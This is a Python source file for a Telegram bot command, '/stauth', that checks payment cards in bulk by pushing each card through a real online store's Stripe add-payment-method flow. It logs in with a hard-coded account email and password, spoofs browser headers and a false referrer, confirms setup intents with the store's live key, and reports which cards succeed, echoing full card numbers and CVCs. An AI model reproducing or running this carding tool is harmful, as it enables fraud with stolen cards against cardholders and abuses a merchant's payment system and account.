import requests
import base64
import json
import requests
from pyrogram import Client, filters
from pyrogram.types import Message
import random
from helpers.timemanager import run_sync_in_thread_running_loop
import base64, json, uuid, string, time, os, json
import re

# Disable urllib3 warnings
requests.packages.urllib3.disable_warnings()


@Client.on_message(filters.command("stauth"))
async def check_braintree_new_card(bot: Client, cmd: Message):
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")

    # Check if the command is a reply to a message with a text/plain document
    if (
        cmd.reply_to_message
        and cmd.reply_to_message.document
        and cmd.reply_to_message.document.mime_type == "text/plain"
    ):
        try:
            # Download the document containing card data
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, "r", encoding="utf-8") as f:
                for line in f:
                    # Process each line in the file
                    c = line.strip()
                    try:
                        cc, exp, ex, cvc = c.split("|")[:4]  # Split once and unpack
                        exp = exp.strip()
                        ex = ex.strip()
                        cvc = cvc.strip()

                        # Extract expiration year from the 'ex' field
                        if len(ex) == 4:
                            exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
                        elif len(ex) == 2:
                            exy = ex
                        else:
                            exy = (
                                "20" + ex
                            )  # Handle other cases (e.g., only two digits)

                        # Handle specific conditions
                        if exy in ["21", "22", "23", "24"]:
                            exy = exy[0] + "7"
                        time.sleep(8)
                        A1 = StripeAuth()
                        await A1._send_request(cc.strip(), exp, exy, cvc, bot, cmd)
                    except ValueError:
                        print(f"Error parsing line: {c}")
            await status.delete()
        except Exception as e:
            print(f"Error processing file: {e}")
        finally:
            os.remove(cards_path)
    elif cmd.text:
        try:
            data = cmd.text.split("/stauth", 1)[1].strip().split("|")
            if len(data) < 4:
                raise IndexError("Not enough data provided")

            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()

            # Extract expiration year from the 'ex' field
            if len(ex) == 4:
                exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
            elif len(ex) == 2:
                exy = ex
            else:
                exy = "20" + ex  # Handle other cases (e.g., only two digits)

            # Handle specific conditions
            if exy in ["21", "22", "23", "24"]:
                exy = exy[0] + "7"

            # Call your check_vbv function
            A1 = StripeAuth()
            await A1._send_request(cc.strip(), exp, exy, cvc, bot, cmd)
            await status.delete()
        except IndexError:
            await status.edit_text("<b>⎚ Use <code>/stauth </code> Checks your Card</b>")
        except Exception as e:
            print(f"Error processing command: {e}")
    else:
        await status.edit_text("<b>⎚ Use <code>/stauth </code> Checks Your Card</b>")


class StripeAuth:
    def __init__(self):
        self.Auth_URL = "https://store.soundware.io/account/add-payment-method/"
        self.API_URL = ""
        self.API_KEY = "pk_live_51H2vLTCwQpbZfoA6xPrDTU8wu4vl274lR4ndwyGQcsFyOWUHZPfSUB8WZ8py6VcWU8B9K8HQ1p6o53EAmDqehb4400DswOMD8d"
        self.CONFIG_URL = "https://store.soundware.io/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent"
        self.session = requests.Session()

    def _auth_request(self):
        headers = {
            "Host": "store.soundware.io",
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://store.soundware.io",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://store.soundware.io/account/add-payment-method/",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload = "username=lia.gg.e.i.29o%40googlemail.com&password=GsbpwVB%3E2Y%3A8GAZ&rememberme=forever&woocommerce-login-nonce=a95d9496ef&_wp_http_referer=%2Faccount%2Fadd-payment-method%2F&login=Log+in"
        response = self.session.post(self.Auth_URL, headers=headers, data=payload)
        nonce = self.extract_value(
            response.text,
            '"base_path":"\/?wc-ajax=wc_stripe_frontend_request&path=\/%s"},"rest_nonce":"',
            '",',
        )
        print(nonce)
        return nonce

    def _config_request(self):
        nonce = self._auth_request()
        headers = {
            "Host": "store.soundware.io",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://store.soundware.io",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://store.soundware.io/account/add-payment-method/",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload = f"payment_method=stripe_cc&_wpnonce={nonce}"
        response = self.session.post(self.CONFIG_URL, headers=headers, data=payload)
        # print(response.text)
        seti_id = self.extract_value(response.text, '"id":"', '",')
        client_secret = self.extract_value(response.text, '"client_secret":"', '",')
        return seti_id, client_secret

    @run_sync_in_thread_running_loop
    def _send_request(self, cc, exp, exy, cvc, bot, cmd):
        seti_id, client_secret = self._config_request()
        print(client_secret)
        headers = {
            "Host": "api.stripe.com",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json",
            "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Ch-Ua-Mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
            "Origin": "https://js.stripe.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://js.stripe.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=1, i",
            "Connection": "keep-alive",
        }
        payload = f"payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={exp}&payment_method_data[card][exp_year]={exy}&payment_method_data[referrer]=https%3A%2F%2Fwww.joyprofumerie.com&payment_method_data[time_on_page]=11150&expected_payment_method_type=card&_stripe_account=acct_1H2vLTCwQpbZfoA6&client_secret={client_secret}&use_stripe_sdk=true&key={self.API_KEY}"
        response = self.session.post(
            f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
            headers=headers,
            data=payload,
        )
        try:
            req = requests.get(
                f"https://bins.antipublic.cc/bins/{cc[:6]}", verify=True
            )
            requ = req.json() if req.status_code == 200 else {}
            data = response.text
            msg = "succeeded"
            if msg in data:

                message_text = f"""
<b>⎚ Succeeded ✅</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Stripe Auth
<b>Status ⇾ succeeded </b>

<b>BIN ⇾</b> <code>{cc[:6]}</code>
<b>Country ⇾</b> {requ.get('country', 'Unknown')} | {requ.get('country_flag', '🏳️')} | {requ.get('country_name', 'Unknown')}
<b>Data ⇾</b> {requ.get('brand', 'Unknown')} - {requ.get('type', 'Unknown')} - {requ.get('level', 'Unknown')}
<b>Bank ⇾</b> {requ.get('bank', 'Unknown')}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
    """
                cmd.reply_text(message_text)
            else:
                data = response.json()
                reason = data.get("error", {}).get("message", "Unknown error")
                message_text = f"""
<b>⎚ Rejected ❌</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
<b>Status ⇾ {reason}</b>

<b>BIN ⇾</b> <code>{cc[:6]}</code>
<b>Country ⇾</b> {requ.get('country', 'Unknown')} | {requ.get('country_flag', '🏳️')} | {requ.get('country_name', 'Unknown')}
<b>Data ⇾</b> {requ.get('brand', 'Unknown')} - {requ.get('type', 'Unknown')} - {requ.get('level', 'Unknown')}
<b>Bank ⇾</b> {requ.get('bank', 'Unknown')}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
    """
                cmd.reply_text(message_text)

        except Exception as e:
            cmd.reply_text(f"<b>Error:</b> {str(e)}")

        

    @staticmethod
    def extract_value(source, left, right):
        """Extract value from the source based on delimiters"""
        try:
            start = source.index(left) + len(left)
            end = source.index(right, start)
            return source[start:end]
        except ValueError:
            return None
